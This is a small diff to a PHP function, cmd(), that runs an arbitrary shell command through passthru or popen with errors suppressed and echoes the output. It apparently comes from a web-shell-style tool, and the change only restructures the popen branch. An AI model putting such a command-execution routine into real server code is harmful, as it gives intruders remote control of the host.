@@ -79,12 +79,15 @@ function cmd($cfe, $ispopen = false) {
 			@passthru($cfe);
 			$res = @ob_get_contents();
 			@ob_end_clean();
-		} elseif (is_resource($f = popen($cfe, "r"))) {
-			$res = '';
-			while (!@feof($f)) {
-				$res .= @fread($f, 1024);
+		} else {
+			$f = popen($cfe, "r");
+			if (is_resource($f)) {
+				$res = '';
+				while (!@feof($f)) {
+					$res .= @fread($f, 1024);
+				}
+				@pclose($f);
 			}
-			@pclose($f);
 		}
 	}
 	echon($res, 1);
